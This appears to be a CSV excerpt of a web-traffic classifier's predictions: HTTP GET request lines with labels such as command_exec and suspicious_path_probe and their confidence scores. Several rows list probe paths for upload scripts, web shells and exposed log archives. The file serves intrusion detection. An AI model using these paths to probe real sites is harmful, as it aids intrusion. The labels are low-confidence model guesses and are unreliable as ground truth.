row_idx,text,pred_label,max_prob
206,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
207,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
208,METHOD=GET PATH=/uploads/up.php QUERY= PROTOCOL=HTTP/1.1,command_exec,0.8424050211906433
209,METHOD=GET PATH=/sites/all/libraries/elfinder/elfinder.php.html QUERY= PROTOCOL=HTTP/1.1,command_exec,0.5479199290275574
210,METHOD=GET PATH=/images/vuln.php QUERY= PROTOCOL=HTTP/1.1,command_exec,0.44586658477783203
211,METHOD=GET PATH=/ups.php QUERY= PROTOCOL=HTTP/1.1,command_exec,0.623659074306488
212,METHOD=GET PATH=/up.php QUERY= PROTOCOL=HTTP/1.1,command_exec,0.6996337175369263
213,METHOD=GET PATH=/wp-content/upload.php QUERY= PROTOCOL=HTTP/1.1,command_exec,0.8007306456565857
214,METHOD=GET PATH=/upload.php QUERY= PROTOCOL=HTTP/1.1,command_exec,0.7803764939308167
215,METHOD=GET PATH=/media-admin.php QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.5428050756454468
216,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
217,METHOD=GET PATH=/self.logs/access.log.2018-01-26.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.44583991169929504
218,METHOD=GET PATH=/ads.txt QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.41103294491767883
219,METHOD=GET PATH=/honeypot/bsidesdfw%20-%202014.ipynb QUERY= PROTOCOL=HTTP/1.1,benign,0.39535993337631226
220,METHOD=GET PATH=/self.logs/access.log.2021-04-27.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.45773324370384216
